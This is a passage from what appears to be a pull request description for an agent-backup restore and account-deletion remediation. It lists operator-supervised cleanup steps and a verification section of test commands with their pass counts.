(a)/(b): re-enqueue deletion with `reEnqueueFailedDeletions`.\n   - (d): run the reap path, which releases the allocation.\n   - (c): run `shutdown` with `stateLossAcknowledged` under an operator-recorded authorization.\n4. **`bridge_url` after reap.** Clear it in `releaseDeletionAllocationOnReap`, so a later attempt does not refuse on a dead bridge. This is a small follow-up code change with a PGlite regression test.\n5. **Dry run, then execute.** Dry-run in staging, then run in production with an operator present. Take a before/after row diff as the audit record.\n\nStill open under #23235: the customer-reachable acknowledged-state-loss delete path.\n\n## Verification\n- `bun test src/lib/services/__tests__/agent-backup-restore-coordinator.pglite.test.ts` (cloud-shared): 4 pass. Covers full finalize, forged-probe rollback, pre-boot retry/resume and target selection.\n- `bun test src/lib/services/agent-backup-capture-v2-escalation.test.ts`: 4 pass.\n- Existing restore/worker suites:\n  - `agent-backup-restore-coordinator-runtime.test.ts`: 3 pass.\n  - `agent-backup-restore-operations-migration.test.ts`: 7 pass.\n  - `agent-backup-restore-v3-materialization.pglite.test.ts`: 1 pass.\n  - `backup-catalog-worker.pglite.test.ts`: 1 pass.\n  - `account-deletion-backup-authority-cycle.pglite.test.ts`: 1 pass.\n- `tsc --noEmit` passes for cloud-shared and cloud-api. `check:router-contract` and `check:worker-bundle` pass for cloud-api.\n- Biome is clean on the changed files.\n- Agent (vitest, one file at a time):\n  - new `agent-backup-restore-v3-controller-worker.test.ts`: 3 pass\n  - new `agent-backup-restore-v3-restored-runtime.test.ts`: 2 pass\n  - `agent-backup-res
